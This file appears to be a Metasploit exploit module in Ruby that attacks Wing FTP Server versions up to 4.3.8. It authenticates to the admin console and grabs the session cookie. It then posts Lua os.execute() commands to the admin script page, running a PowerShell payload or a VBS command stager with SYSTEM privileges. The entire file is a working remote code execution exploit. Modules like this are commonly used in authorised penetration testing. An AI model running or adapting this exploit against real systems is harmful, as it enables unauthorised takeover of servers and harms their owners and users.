##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/powershell'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wing FTP Server Authenticated Command Execution',
      'Description'    => %q{
        This module exploits the embedded Lua interpreter in the admin web interface for
        versions 4.3.8 and below. When supplying a specially crafted HTTP POST request
        an attacker can use os.execute() to execute arbitrary system commands on
        the target with SYSTEM privileges.
      },
      'Author'         =>
        [
          'Nicholas Nam <nick[at]executionflow.org>',
          'Imran E. Dawoodjee <imrandawoodjee.infosec[at]gmail.com>' # minor improvements
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'http://www.wftpserver.com'],
          ['Admin Console Info', 'https://www.wftpserver.com/help/ftpserver/index.html?administrator_console.htm']
        ],
      'Arch'           => ARCH_X86,
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['PowerShell', {}],
          ['CmdStager', {}]
        ],
      'Privileged'     => true,
      'DisclosureDate' => 'Jun 19 2014',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(5466),
        OptString.new('USERNAME', [true, 'Admin username', '']),
        OptString.new('PASSWORD', [true, 'Admin password', ''])
      ], self.class
    )
    deregister_options('CMDSTAGER::FLAVOR')
  end

  @session_cookie = ''

  def check
    @session_cookie = authenticate(datastore['USERNAME'], datastore['PASSWORD'])
    if @session_cookie.nil?
      return CheckCode::Unknown
    end

    ver = send_request_cgi(
      'uri'       => '/admin_license.html',
      'method'    => 'POST',
      'cookie'    => @session_cookie
    )

    unless ver
      vprint_error "Connection failed!"
      return CheckCode::Unknown
    end

    unless ver.code == 200 && ver.get_html_document.text.to_s.include?('Wing FTP Server')
      return CheckCode::Safe
    end

    version = ver.get_html_document.at('span').text.to_s
    vprint_status "Found #{version}"

    # LUA capabilities and administrator console were added in version 3.0.0
    if version[/([3-4]\.[0-3]\.[0-8])/]
      print_good("#{version} appears vulnerable.")
      return CheckCode::Appears
    end

    return CheckCode::Safe
  end

  def exploit
    unless [CheckCode::Appears].include? check
      fail_with Failure::NotVulnerable, 'Target is most likely not vulnerable!'
    end

    case target.name
    when 'PowerShell'
      print_status('Executing payload via Powershell...')
      psh_command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, remove_comspec: true)
      execute_command(psh_command)
    when 'CmdStager'
      print_status("Sending payload")
      # Execute the cmdstager, max length of the commands is ~1500
      execute_cmdstager(flavor: :vbs, linemax: 1500)
    end
  end

  def execute_command(cmd, _opts = {})
    # Powershell cmd has a lot of special characters. Wrap it with [[ ]] to prevent problems.
    # We also don't need to append "cmd.exe /c" for the commands
    command = "os.execute([[#{cmd}]])"

    res = send_request_cgi(
      'uri'       => '/admin_lua_script.html',
      'method'    => 'POST',
      'cookie'    => @session_cookie,
      'vars_post' => { 'command' => command }
    )

    if res && res.code != 200
      fail_with(Failure::Unknown, "#{peer} - Something went wrong.")
    end
  end

  def authenticate(username, password)
    print_status("Authenticating...")
    res = send_request_cgi(
      'uri'       => '/admin_loginok.html',
      'method'    => 'POST',
      'vars_post' => {
        'username'     => username,
        'password'     => password,
        'username_val' => username,
        'password_val' => password,
        'submit_btn'   => '+Login+'
      }
    )

    unless res
      print_error("#{peer} - Admin login page was unreachable.")
      return nil
    end

    if res.code == 200 && res.body =~ /location='main.html\?lang=english';/
      res.get_cookies.split(';').each do |cookie|
        cookie.split(',').each do |value|
          if value.split('=')[0] =~ /UIDADMIN/
            vprint_status("Authentication successful, got session cookie #{value.split('=')[1]}")
            return value.to_s
          end
        end
      end
    end

    print_error("#{peer} - Authentication failed")
    return nil
  end
end
